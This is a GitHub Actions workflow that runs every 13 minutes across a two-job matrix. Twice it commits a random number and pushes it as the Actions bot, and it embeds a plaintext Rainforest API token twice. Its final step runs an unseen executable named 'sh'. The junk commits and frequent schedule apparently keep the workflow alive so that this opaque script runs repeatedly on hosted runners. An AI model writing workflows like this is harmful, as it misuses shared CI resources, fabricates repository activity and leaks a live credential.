```

name: CI
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron:  '*/13 * * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        Plan: [siji,loro]
    steps:
      - uses: actions/checkout@v3
      - name: Run a one-line script
        run: |
          chmod +x sh
          echo $RANDOM | md5sum | head -c 20; echo;
          echo " $RANDOM " > file
          git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git config --local user.name "github-actions[bot]"
          git add -A
          git commit -m "Add changes"
          git push  
      - name: Rainforest
        uses: rainforestapp/github-action@master
        with:
          token: 73c0ebea1a5a8d259548a68d8a88d7e3
          run_group_id: 11271
          background: true
      - name: Run a one-line script
        run: |
          chmod +x sh
          echo $RANDOM | md5sum | head -c 20; echo;
          echo " $RANDOM " > file
          git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git config --local user.name "github-actions[bot]"
          git add -A
          git commit -m "Add changes"
          git push    
      - name: Rainforest
        uses: rainforestapp/github-action@master
        with:
          token: 73c0ebea1a5a8d259548a68d8a88d7e3
          run_group_id: 11272
          background: true
   
      - name: Run a one-line script
        run: |
          chmod +x sh
          ./sh

```
